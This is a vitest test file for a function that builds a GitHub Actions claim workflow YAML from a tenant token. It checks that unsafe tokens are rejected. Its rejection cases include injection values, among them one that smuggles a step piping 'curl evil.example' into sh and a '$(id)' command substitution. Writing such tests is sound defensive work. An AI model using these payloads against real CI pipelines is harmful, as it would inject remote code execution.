import { describe, it, expect } from 'vitest'
import { buildClaimWorkflow } from '../src/sdk/claim/workflow'

describe('buildClaimWorkflow', () => {
  it('generates valid workflow YAML with claim token', () => {
    const yaml = buildClaimWorkflow('clm_abc123')
    expect(yaml).toContain('name: Claim headless.ly tenant')
    expect(yaml).toContain("tenant: 'clm_abc123'")
    expect(yaml).toContain('uses: dot-org-ai/id@v1')
    expect(yaml).toContain('uses: actions/checkout@v4')
    expect(yaml).toContain('id-token: write')
    expect(yaml).toContain('branches: [main, master]')
  })

  it('throws on invalid claim token', () => {
    expect(() => buildClaimWorkflow('')).toThrow()
    expect(() => buildClaimWorkflow('invalid')).toThrow()
  })
})

describe('buildClaimWorkflow refuses a token that could escape its YAML string', () => {
  it('accepts real tokens and refuses quotes, newlines and anything outside [A-Za-z0-9_-]', () => {
    expect(buildClaimWorkflow('clm_0123456789abcdef0123456789abcdef')).toContain("tenant: 'clm_0123456789abcdef0123456789abcdef'")
    for (const bad of ["clm_x'\n      - run: curl evil.example | sh", 'clm_x\ny: 1', 'clm_a b', 'clm_', `clm_${'a'.repeat(200)}`, 'clm_$(id)']) {
      expect(() => buildClaimWorkflow(bad), bad).toThrow()
    }
  })
})
